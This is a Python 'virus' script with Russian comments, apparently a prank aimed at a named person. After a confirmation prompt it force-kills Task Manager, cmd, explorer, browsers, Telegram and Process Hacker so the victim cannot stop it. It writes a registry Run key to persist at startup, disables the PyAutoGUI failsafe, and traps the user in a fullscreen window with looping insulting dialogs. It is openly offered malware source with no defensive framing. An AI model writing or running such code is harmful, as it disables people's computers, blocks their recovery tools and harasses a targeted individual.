# Импортируем нужные библеотики
import pyautogui as pg
import pyautogui
from tkinter import *
import os
# Предупреждение о опасности вируса и хотите ли вы его открыть
while True:
    result4 = pg.confirm('Вы точно хотите открыть эту программу', buttons=['Открыть','Выход'])
    if result4 == 'Выход':
        exit()
    if result4 == 'Открыть':

     # Закрываем приложения навсегда (пока запущен вирус) чтобы пользователь не смог их открыть чтобы обезвредить вирус
     os.system("@echo off")
     os.system("taskkill /f /im Taskmgr.exe")
     os.system("taskkill /f /im opera.exe")
     os.system("taskkill /f /im msedge.exe")
     os.system("taskkill /f /im Telegram.exe")
     os.system("taskkill /f /im SndVol.exe")
     os.system("taskkill /f /im cmd.exe")
     os.system("taskkill /f /im notepad.exe")
     os.system("taskkill /f /im ToxidChecker.exe")
     os.system("taskkill /f /im ProcessHacker.exe")
     os.system("taskkill /f /im explorer.exe")
     os.system("reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Virus /t REG_SZ /d %windir%\virus.py /f")
     # Создаем окно с помощью Tkinter
     root = Tk()
     root.attributes('-fullscreen', True)  # Переводим окно в полноэкранный режим
     
     # Получаем размеры экрана
     screen_width = root.winfo_screenwidth()
     screen_height = root.winfo_screenheight()
     
     # Отключаем защиту PyAutoGUI
     pyautogui.FAILSAFE = False
     
     # Перемещаем курсор в правый нижний угол экрана
     pyautogui.moveTo(screen_width, screen_height)
     # 1 окно с кнопками
     while True:
     # сам вопрос в вирусе и кнопки да и нет 
         result = pg.confirm('Ты лох?', buttons=['Да', 'Нет'])
     # А здесь создание условия что будет если пользователь пример(Мираккарим) в вирусе нажмет на кнопку да или нет
         if result == 'Да':
            os.system("start explorer.exe")
            break
         if result == 'Нет':
     # второе окно с самим вопросом кнопками и так далее
                while True:
                 result2 = pg.confirm('Ты точно не лох?', buttons=['Да лох', 'Нет не лох'])
                 if result2 == 'Да лох':
                     break
         while True:
                 result3 = pg.confirm('Ты точно лох?', buttons=['Да лох', 'Нет не лох'])
                 if result3 == 'Да лох':
                     break
     
     # а вот здесь перед запуском самого вируса запускаем окно с белым экраном на полноекранный режим который я написал в начале самой программы которое сложно закрыть чтобы пользователь пример(Мираккарим) немного потрудился обезвредить сначало это!!!!!
     root.mainloop()
     






     